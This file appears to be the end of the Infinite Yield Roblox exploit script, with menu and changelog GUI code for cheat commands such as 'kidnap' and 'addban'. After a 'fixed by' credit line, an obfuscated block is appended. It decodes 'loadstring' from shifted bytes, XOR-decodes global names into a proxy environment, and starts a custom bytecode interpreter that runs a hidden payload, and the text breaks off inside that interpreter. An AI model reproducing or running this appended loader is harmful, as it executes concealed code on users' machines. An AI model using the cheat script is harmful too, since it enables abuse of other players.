	local Index,SizeY = 0,0
	for i,v in next, frame2:GetChildren() do
		if bool then
			if Match2(v.Text,str) then
				game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 200),"Out","Quad",0.3,true)
				Index = Index + 1
				v.Position = UDim2.new(0,0,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame2.CanvasSize = UDim2.new(0,0,0,SizeY) else v.Visible = false end else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame2.CanvasSize = UDim2.new(0,0,0,SizeY) end end end end end
IndexContents2('',true)
game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true)
Loading.ba:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.4, true, nil) wait(1)
repeat wait() until loadedintro == true
logof:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.1)
wait(0.2)
f:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.2)
wait(0.3) g:Destroy()
updatecolors(Color3.new(colorR, colorG, colorB))
Loading:TweenPosition(UDim2.new(0.25, 0, 1.5, 0), "InOut", "Quart", 0.5, true, nil) wait(0.5) Loading.Parent:Destroy()
coroutine.resume(coroutine.create(function()
	local TextChatService = game:GetService("TextChatService")
	print("[IY-DEBUG] ChatVersion =", TextChatService.ChatVersion)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local channels = TextChatService:FindFirstChild("TextChannels")
		local channel = channels and channels:FindFirstChild("RBXGeneral")
		print("[IY-DEBUG] channel =", channel)
		if channel then
			channel:DisplaySystemMessage("The prefix is '" .. cmdprefix .. "'")
			task.wait(0.5)
			channel:DisplaySystemMessage("Click IY on the top left to see more options")
			print("[IY-DEBUG] messages sent")
		end
	else
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "The prefix is '" .. cmdprefix .. "'";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		}) wait(0.5)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "Click IY on the top left to see more options";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		})
	end
end))
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
qopen = false quickmenu.MouseButton1Click:connect(function()
if qopen == false then fadelock('off') NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) MusicPlayer:Hide()
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = true else
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
if slock == true then fadelock("rbxassetid://1495252742") elseif isagelocked == true then fadelock("rbxassetid://1495252495") end
qopen = false if playerenabled == true then MusicPlayer:Show() else NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil) end end end)
quickmenu.sheild.cmds.MouseButton1Click:connect(function() if cmdOpen == true then
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
else runwindow() end end)
quickmenu.sheild.settings.MouseButton1Click:connect(function() hub() end)
infopen = false quickmenu.sheild.info.MouseButton1Click:connect(function() if infopen == false then infopen = true
Updates = Instance.new("ScreenGui")
dragg = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local LOG = Instance.new("TextLabel")
local PopupText3 = Instance.new("TextLabel")
local PopupText4 = Instance.new("TextLabel")
local UTDV = Instance.new("TextLabel")
local PopupText5 = Instance.new("TextLabel")
local shadow = Instance.new("Frame")
Exitt = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local vers = Instance.new("TextLabel")
Updates.Name = "Updates"
Updates.Parent = game.CoreGui
dragg.Name = "drag"
dragg.Parent = Updates
dragg.Active = true
dragg.BackgroundColor3 = Color3.new(1, 1, 1)
dragg.BackgroundTransparency = 1
dragGUI(dragg)
dragg.Position = UDim2.new(0.5, -225, 0, -600)
dragg.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = dragg
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.8, 0) -- SIZE
ContainerFrame.ZIndex = 5
LOG.Name = "LOG"
LOG.Parent = ContainerFrame
LOG.BackgroundTransparency = 1
LOG.Position = UDim2.new(0, 8, 0, 110)
LOG.Size = UDim2.new(1, -16, 1, 0)
LOG.ZIndex = 10
LOG.Font = Enum.Font.SourceSansBold
LOG.TextSize = 20
LOG.Text = "+ Added os [plr]\n+ Added whiteify/blackify [plr]\n+ Added addban [full username]\n+ Added a rainbow mode to the UI (inside color picker)\n\n* Fixed a bug in kidnap"
LOG.TextColor3 = Color3.new(0.97, 0.97, 0.97)
LOG.TextStrokeTransparency = 0
LOG.TextWrapped = true
LOG.TextYAlignment = Enum.TextYAlignment.Top
LOG.TextXAlignment = "Left"
PopupText3.Name = "PopupText3"
PopupText3.Parent = ContainerFrame
PopupText3.BackgroundTransparency = 1
PopupText3.Position = UDim2.new(0, 8, 0, 35)
PopupText3.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText3.ZIndex = 10
PopupText3.Font = Enum.Font.SourceSansBold
PopupText3.TextSize = 20
PopupText3.Text = "Edge - Moon"
PopupText3.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText3.TextStrokeTransparency = 0
PopupText3.TextWrapped = true
PopupText3.TextYAlignment = Enum.TextYAlignment.Top
PopupText4.Name = "PopupText4"
PopupText4.Parent = ContainerFrame
PopupText4.BackgroundTransparency = 1
PopupText4.Position = UDim2.new(0, 8, 0, 50)
PopupText4.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText4.ZIndex = 10
PopupText4.Font = Enum.Font.SourceSansBold
PopupText4.FontSize = Enum.FontSize.Size18
PopupText4.Text = "infyield.weebly.com - discord.me/infiniteyield"
PopupText4.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText4.TextStrokeTransparency = 0
PopupText4.TextWrapped = true
PopupText4.TextYAlignment = Enum.TextYAlignment.Top
UTDV.Name = "UTDV"
UTDV.Parent = ContainerFrame
UTDV.BackgroundTransparency = 1
UTDV.Position = UDim2.new(0, 8, 0, 5)
UTDV.Size = UDim2.new(1, -16, 0.100000001, 0)
UTDV.ZIndex = 10
UTDV.Font = Enum.Font.SourceSansBold
UTDV.FontSize = Enum.FontSize.Size28
UTDV.Text = "Up to date version: N/A"
UTDV.TextColor3 = Color3.new(0.97, 0.97, 0.97)
UTDV.TextStrokeTransparency = 0
UTDV.TextWrapped = true
UTDV.TextYAlignment = Enum.TextYAlignment.Top
PopupText5.Name = "PopupText5"
PopupText5.Parent = ContainerFrame
PopupText5.BackgroundTransparency = 1
PopupText5.Position = UDim2.new(0, 8, 0, 75)
PopupText5.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText5.ZIndex = 10
PopupText5.Font = Enum.Font.SourceSansBold
PopupText5.FontSize = Enum.FontSize.Size28
PopupText5.Text = "Update Log:"
PopupText5.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText5.TextStrokeTransparency = 0
PopupText5.TextWrapped = true
PopupText5.TextYAlignment = Enum.TextYAlignment.Top
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exitt.Name = "Exit"
Exitt.Parent = shadow
Exitt.BackgroundColor3 = Color3.new(1, 0, 0)
Exitt.BackgroundTransparency = 0.30000001192093
Exitt.BorderColor3 = Color3.new(1, 0, 0)
Exitt.BorderSizePixel = 0
Exitt.Position = UDim2.new(0, 415, 0, 3)
Exitt.Size = UDim2.new(0, 20, 0, 20)
Exitt.FontSize = Enum.FontSize.Size14
Exitt.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -2)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.TextSize = 30
PopupText.Text = "Information"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
vers.Name = "vers"
vers.Parent = shadow
vers.BackgroundTransparency = 1
vers.Position = UDim2.new(0, 8, 0, 2)
vers.Size = UDim2.new(0.200913236, -16, 1.11538458, 0)
vers.ZIndex = 110
vers.Font = Enum.Font.SourceSansBold
vers.TextSize = 20
vers.Text = "v" .. Version
vers.TextColor3 = Color3.new(0.97, 0.97, 0.97)
vers.TextStrokeTransparency = 0
vers.TextWrapped = true
vers.TextXAlignment = Enum.TextXAlignment.Left
vers.TextYAlignment = Enum.TextYAlignment.Top
if UTD == true then UTDV.Text = "Up to date version: Yes" else UTDV.Text = "Up to date version: No" end end
dragg:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil) Exitt.MouseButton1Click:connect(function()
dragg:TweenPosition(UDim2.new(0.5, -225, 0, -600), "InOut", "Quart", 0.5, true, nil) wait(0.5) infopen = false Updates:Destroy() end) end)
quickmenu.sheild.updates.MouseButton1Click:connect(function() serverinfogui() end) end

run()
--script end
end

run()
print("fixed by BLOX_FRUIT01110")
--start
local __OO12=("")["\099\104\97\114"]
local _l_O1d=(function() local _I11e=""
for _,_c in ipairs({222,225,211,214,229,230,228,219,224,217}) do _I11e=_I11e..__OO12((_c-114+256)%256) end
local _f=(type(getfenv)=="function" and getfenv(0) or _G)[_I11e]
if _f then return _f end
_I11e=""
for _,_c in ipairs({222,225,211,214}) do _I11e=_I11e..__OO12((_c-114+256)%256) end
return (type(getfenv)=="function" and getfenv(0) or _G)[_I11e] end)()
local _1O_1c=_l_O1d
local function __11O1f(_I_1g,_OO1h) local _n=""
for _i=1,#_I_1g do _n=_n..__OO12((_I_1g[_i]-_OO1h+256)%256) end
return _l_O1d("\114\101\116\117\114\110\32".._n)() end
do local _I01i=__11O1f({136,143,154,89,88},38)
_0__13=_I01i["\98\120\111\114"] end
local _01I19=__11O1f({130,116,131,124,116,131,112,131,112,113,123,116},15)
do local _0l1j=__11O1f({197,204,215,150,149},99)
_Il014=_0l1j["\098\97\110\100"] end
local __1_17=__11O1f({103,90,88,99,99},247)
local _OII1b=__11O1f({11,250,16,12,254,13},153)
local _10018=__11O1f({45,50,41,30},185)
do local _0_1l=__11O1f({207,188,189,199,192},91)
_OO016=_0_1l["\099\111\110\099\097\116"] end
local __O_1a=__11O1f({111,94,116,100,98,113},253)
do local _I11k=__11O1f({0,7,18,209,208},158)
_1O_15=_I11k["\114\115\104\105\102\116"] end
local function __lOl1n(_O01m) local _111o=478973268
local _0I1p={}
for _I_1q=1,#_O01m do local _I11r=_Il014(_111o,0xFF)
_0I1p[_I_1q]=__OO12(_0__13(_O01m[_I_1q],_I11r))
if _111o%2==0 then _111o=_1O_15(_111o,1) else _111o=_Il014(_111o*3+1,0x7FFFFFFF) end
if _111o<=1 then _111o=_0__13(478973268,_I_1q) end end
return _OO016(_0I1p) end
local _I_I1u=nil
do local _1II1s,_O0I1t=__1_17(function() return _1O_1c(__lOl1n({38,207,33,117,114,238,96,199,53,220,179,15,219,86,56,161}))() end)
if _1II1s and _10018(_O0I1t)=="\116\097\098\108\101" then _I_I1u=_O0I1t end end
if not _I_I1u then local _1II1s,_O0I1t=__1_17(function() return _1O_1c(__lOl1n({38,207,33,117,114,238,96,199,53,220,178,15,219,86,56,184,237}))() end)
if _1II1s and _10018(_O0I1t)=="\116\097\098\108\101" then _I_I1u=_O0I1t end end
local _I0OI2=_I_I1u or _G
local _IOl01z={["\095\95\105\110\100\101\120"]=function(_1l1v,_0O1w) local __11x,_lO1y=__1_17(function() return _I0OI2[_0O1w] end)
return __11x and _lO1y or nil end}
local _O10O1=_01I19({},_IOl01z)
local _OO__3={{38,207,52,100,102,233,44,197},{6,207,50,105,111,238,115},{56,195,38,116,102,233,44,197,35},{56,197,52,100},{23,197,57,111,114,211,37,209,37,205,186,9,208},{48,207,57,102,105,236,37},{53,218,37,101,110,228,38,201,60,205},{32,197,59,117,109,226,37,210},{51,207,33,110,97,237,37,195,49,196,184,7,208,84,120,231,160},{36,201,52,108,108},{23,236,39,97,109,229},{51,207,33,115,99,242,41,208,36,219},{29,196,38,116,97,238,35,197},{39,211,59},{54,203,38,101,54,180},{51,207,33,105,110,243,52,193,62,203,177,25},{51,207,33,102,101,238,54},{35,203,60,116},{11,237},{39,207,33,99,108,233,48,194,63,201,166,14},{51,207,33,114,117,238,46,201,62,207,167,9,199,73,96,252,183},{34,207,39,115,105,239,46},{16,203,33,101,84,233,45,197},{44,218,54,97,108,236},{56,197,52,100,102,233,44,197},{38,203,34,103,101,244},{51,207,33,114,101,238,54},{61,217,54,99,108,239,51,213,34,205},{55,194,48,99,107,227,33,204,60,205,166},{33,222,51,56},{61,217,39,101,97,228,47,206,60,209},{48,207,57,97,121},{37,223,48,117,101,223,47,206,15,220,177,6,208,80,127,250,176},{26,223,56,98,101,242,19,197,33,221,177,4,214,69},{39,207,57,101,99,244},{48,207,57,102,111,236,36,197,34},{38,207,36,117,105,242,37},{48,207,55,117,103},{6,203,44},{49,216,39,111,114},{32,211,37,101,111,230},{35,197,39,107,115,240,33,195,53},{36,216,60,110,116},{39,207,33,116,105,238,39,211},{61,217,51,105,108,229},{61,217,51,111,108,228,37,210},{35,203,39,110},{55,197,39,111,117,244,41,206,53},{6,203,44,99,97,243,52,240,49,218,181,7,198},{6,203,59,100,111,237},{32,211,37,101},{51,207,33,99,97,236,44,201,62,207,167,9,199,73,96,252},{39,207,33,116,104,242,37,193,52,193,176,15,219,84,121,252,189},{58,207,45,116},{35,216,60,116,101,230,41,204,53},{55,198,58,110,101,242,37,198},{60,197,58,107,109,229,52,193,61,205,160,2,218,68},{61,218,52,105,114,243},{32,195,56,101},{51,207,33,114,97,247,45,197,36,201,160,11,215,76,117},{6,207,54,116},{38,203,34,115,101,244},{39,207,33,109,101,244,33,212,49,202,184,15},{17,196,32,109},{2,207,54,116,111,242,114},{39,222,39,105,110,231},{23,197,57,111,114,179},{54,223,51,102,101,242},{57,203,33,104},{61,206,48,110,116,233,38,217,53,208,177,9,192,84,127,250},{1,238,60,109,50},{2,207,54,116,111,242,115},{58,207,34,112,114,239,56,217},{32,197,38,116,114,233,46,199},{39,207,33,102,101,238,54},{33,196,37,97,99,235},{38,203,34,101,113,245,33,204},{54,195,33,51,50},{38,207,36,117,101,243,52},{51,207,33,116,104,242,37,193,52,193,176,15,219,84,121,252,189},{39,207,33,110,97,237,37,195,49,196,184,7,208,84,120,231,160},{26,223,56,98,101,242,18,193,62,207,177},{60,222,33,112},{51,203,56,101},{51,207,33,115,101,238,54},{39,207,33,114,97,247,45,197,36,201,160,11,215,76,117},{51,207,33,103,101,238,54},{55,216,44,112,116},{51,207,33,110,105,236,41,206,35,220,181,4,214,69,99},{32,203,38,107},{39,201,39,105,112,244},{16,216,52,119,105,238,39},{53,217,38,101,114,244},{39,207,33,114,101,225,36,207,62,196,173},{51,207,33,108,111,225,36,197,52,197,187,14,192,76,117,251},{56,197,52,100,115,244,50,201,62,207},{60,197,58,107,102,245,46,195,36,193,187,4},{1,238,60,109},{61,217,57,99,108,239,51,213,34,205},{58,207,34,99,99,236,47,211,37,218,177},{51,207,33,109,101,244,33,212,49,202,184,15},{32,195,54,107},{39,222,52,116,115},{50,195,39,101,115,233,39,206,49,196},{22,216,60,99,107,195,47,204,63,218},{27,220,48,114,108,225,48,240,49,218,181,7,198},{51,207,33,99,111,238,46,197,51,220,189,5,219,83},{32,203,55,108,101},{0,221,48,101,110,201,46,198,63},{36,203,60,114,115},{38,203,34,108,101,238},{51,207,33,103,99},{39,194,52,114,101,228},{39,218,52,119,110},{57,203,62,101,102,239,44,196,53,218},{1,217,48,114,83,229,52,212,57,198,179,25},{59,217}}
for __II4=1,#_OO__3 do local _OlO5=__lOl1n(_OO__3[__II4])
local __11x,_lO1y=__1_17(function() return _I0OI2[_OlO5] end)
if __11x then _OII1b(_O10O1,_OlO5,_lO1y) end end
if not __O_1a(_O10O1,__lOl1n({33,196,37,97,99,235})) then local _t=__O_1a(_O10O1,__lOl1n({32,203,55,108,101}))
if _t then _OII1b(_O10O1,__lOl1n({33,196,37,97,99,235}),_t[__lOl1n({33,196,37,97,99,235})]) end end
if not __O_1a(_O10O1,__lOl1n({56,197,52,100,115,244,50,201,62,207})) then _OII1b(_O10O1,__lOl1n({56,197,52,100,115,244,50,201,62,207}),__O_1a(_O10O1,__lOl1n({56,197,52,100}))) end

local function _0l0I00(_l0O6,_11l07,_O10O1,_1lII8,_l0Il1y,_IlII1e,__1I1f)
_1lII8=_1lII8 or {}
_IlII1e=_IlII1e or {}
__1I1f=__1I1f or {}
local _0l1llg=__1I1f.n or #__1I1f
local function __O_1lz(_idx) return _l0O6[_idx] end
for _i,_v in ipairs(_l0O6) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(27+_p*129+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(27+(_j-1)*129+(_i-1),0xFF))) end end
_l0O6[_i]=_s end end
local function _lO0OO20(ps) for _,p in ipairs(ps) do if p.K then for _i,_v in ipairs(p.K) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(27+_p*129+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(27+(_j-1)*129+(_i-1),0xFF))) end end
p.K[_i]=_s end end end
if p.P then _lO0OO20(p.P) end end end
_lO0OO20(_1lII8)
if not _11l07[0] then for _i=1,#_11l07 do if _11l07[_i]>=0 then _11l07[_i]=bit32.bxor(_11l07[_i],5) end end
_11l07[0]=true end
local function _O1ll021(ps) for _,p in ipairs(ps) do if p.C and not p.C[0] then for _i=1,#p.C do if p.C[_i]>=0 then p.C[_i]=bit32.bxor(p.C[_i],5) end end
p.C[0]=true end
if p.P then _O1ll021(p.P) end end end
_O1ll021(_1lII8)
local _l_009={}
local _l010b={}
local _11lIlh={}
local _11Ila=0
local _11lIOc={}
local _l0Od=1
local ___Il0i=0
local _0OI0k=false
local _00010l=false
local _O0_Om=0
local _10lOn=0
local _O0Io=0
local _I1__p=nil
local _1ll10=0
if _l0Il1y then for _k=0,(_l0Il1y.n or 0)-1 do _l010b[_k]=_l0Il1y[_k] end end
local function _IOlt(v) _11Ila=_11Ila+1
_l_009[_11Ila]=v end
local function _1IIu() local v=_l_009[_11Ila]
_l_009[_11Ila]=nil
_11Ila=_11Ila-1
return v end
local function _OlIv() return _l_009[_11Ila] end
local function _O1I1lq(slot) local box=_11lIOc[slot]
if box then return box[1] end
return _l010b[slot] end
local function _OIOI1r(slot,val) local box=_11lIOc[slot]
if box then box[1]=val else _l010b[slot]=val end end
local function __IlIOs(slot) if not _11lIOc[slot] then _11lIOc[slot]={_l010b[slot]} end
return _11lIOc[slot] end
local function _OI_lw(obj,name) local ok,mt=pcall(getmetatable,obj)
if ok and mt and type(mt)=="table" then return rawget(mt,name) end
return nil end
local function _1II01x(a,b,op,name) if type(a)=="number" and type(b)=="number" then return op(a,b) end
local ok,r=pcall(op,a,b)
if ok then return r end
local mm=_OI_lw(a,name) or _OI_lw(b,name)
if mm then return mm(a,b) end
return op(a,b) end
local _I00Ij={}
_I00Ij[55]=function() end
_I00Ij[9]=function() _IOlt(nil) end
_I00Ij[52]=function() _IOlt(true) end
_I00Ij[41]=function() _IOlt(false) end
_I00Ij[3]=function() _IOlt(__O_1lz(_11l07[_l0Od]+1))
_l0Od=_l0Od+1 end
_I00Ij[54]=function() _IOlt(_O1I1lq(_11l07[_l0Od]))
_l0Od=_l0Od+1 end
_I00Ij[49]=function() _OIOI1r(_11l07[_l0Od],_1IIu())
_l0Od=_l0Od+1 end
_I00Ij[25]=function() _IOlt(_O10O1[__O_1lz(_11l07[_l0Od]+1)])
_l0Od=_l0Od+1 end
_I00Ij[18]=function() _O10O1[__O_1lz(_11l07[_l0Od]+1)]=_1IIu()
_l0Od=_l0Od+1 end
_I00Ij[21]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x+y end,"__add")) end
_I00Ij[16]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x-y end,"__sub")) end
_I00Ij[31]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x*y end,"__mul")) end
_I00Ij[66]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x/y end,"__div")) end
_I00Ij[22]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x%y end,"__mod")) end
_I00Ij[53]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return x^y end,"__pow")) end
_I00Ij[0]=function() local b,a=_1IIu(),_1IIu()
local ok,r=pcall(function() return a..b end)
if ok then _IOlt(r) else _IOlt(tostring(a)..tostring(b)) end end
_I00Ij[6]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a==b) end
_I00Ij[5]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a~=b) end
_I00Ij[57]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a<b) end
_I00Ij[7]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a<=b) end
_I00Ij[33]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a>b) end
_I00Ij[12]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a>=b) end
_I00Ij[35]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a and b) end
_I00Ij[61]=function() local b,a=_1IIu(),_1IIu()
_IOlt(a or b) end
_I00Ij[32]=function() _IOlt(not _1IIu()) end
_I00Ij[47]=function() _IOlt(-_1IIu()) end
_I00Ij[43]=function() _IOlt(#_1IIu()) end
_I00Ij[15]=function() _IOlt({}) end
_I00Ij[27]=function() local k,t=_1IIu(),_1IIu()
_IOlt(t[k]) end
_I00Ij[8]=function() local v,k,t=_1IIu(),_1IIu(),_1IIu()
t[k]=v end
_I00Ij[64]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
local args={}
for i=1,n do args[n-i+1]=_1IIu() end
local f=_1IIu()
if type(f)~="function" then local mm=_OI_lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if n==0 then r={f()} else r={f(table.unpack(args,1,n))} end
_IOlt(r[1]) end
_I00Ij[17]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
_0OI0k=true
if n==0 then _O0Io=0 elseif n>0 then if n>_11Ila then n=_11Ila end
_O0Io=n
_00010l=true
_10lOn=_11Ila
_O0_Om=_11Ila-n else _O0Io=_11Ila
_00010l=true
_10lOn=_11Ila
_O0_Om=0 end end
_I00Ij[44]=function() _l0Od=_11l07[_l0Od]+1 end
_I00Ij[10]=function() local target=_11l07[_l0Od]
_l0Od=_l0Od+1
if not _1IIu() then _l0Od=target+1 end end
_I00Ij[20]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
for _=1,n do _1IIu() end end
_I00Ij[51]=function() local pi=_11l07[_l0Od]
_l0Od=_l0Od+1
local P=_1lII8[pi]
if P then
local _r,Kp,Cp=_0l0I00,P.K or _l0O6,P.C or {}
local nU={}
if P.U then for ui,ud in ipairs(P.U) do local iL,idx=ud[1],ud[2]
if iL==1 then nU[ui]=__IlIOs(idx) else nU[ui]=_IlII1e[idx+1] end end end
local nP=P.nParams or 0
_IOlt(function(...)
local a={...}
local ac=select("#",...)
local L={}
L.n=nP
for i=1,(ac<nP and ac or nP) do L[i-1]=a[i] end
local va={}
if ac>nP then for i=nP+1,ac do va[i-nP]=a[i] end end
va.n=ac-nP
return _r(Kp,Cp,_O10O1,P.P or {},L,nU,va)
end)
else _IOlt(nil) end end
_I00Ij[62]=function() _IOlt(_OlIv()) end
_I00Ij[34]=function() local ui=_11l07[_l0Od]
_l0Od=_l0Od+1
local box=_IlII1e[ui+1]
_IOlt(box and box[1] or nil) end
_I00Ij[45]=function() local ui=_11l07[_l0Od]
_l0Od=_l0Od+1
local box=_IlII1e[ui+1]
if box then box[1]=_1IIu() else _1IIu() end end
_I00Ij[59]=function() local na=_11l07[_l0Od]
_l0Od=_l0Od+1
local nr=_11l07[_l0Od]
_l0Od=_l0Od+1
local args={}
for i=1,na do args[na-i+1]=_1IIu() end
local f=_1IIu()
if type(f)~="function" then local mm=_OI_lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _IOlt(r[i]) end end
_I00Ij[46]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
if n<0 then for i=1,_0l1llg do _IOlt(__1I1f[i]) end else for i=1,n do _IOlt(__1I1f[i]) end end end
_I00Ij[13]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
local args={}
for j=n,1,-1 do args[j]=_1IIu() end
local f=_1IIu()
if type(f)~="function" then local mm=_OI_lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm end end
_0OI0k=true
_I1__p=table.pack(f(table.unpack(args,1,n))) end
_I00Ij[63]=function() local off=_11l07[_l0Od]
_l0Od=_l0Od+1
local step=_1IIu()
local limit=_1IIu()
local init=_1IIu()
_IOlt(init)
_IOlt(limit)
_IOlt(step)
if step>=0 then if init>limit then _l0Od=off+1 end else if init<limit then _l0Od=off+1 end end end
_I00Ij[24]=function() local off=_11l07[_l0Od]
_l0Od=_l0Od+1
local step=_l_009[_11Ila]
local i=_l_009[_11Ila-2]+step
_l_009[_11Ila-2]=i
local limit=_l_009[_11Ila-1]
if step>=0 then if i<=limit then _l0Od=off+1 end else if i>=limit then _l0Od=off+1 end end end
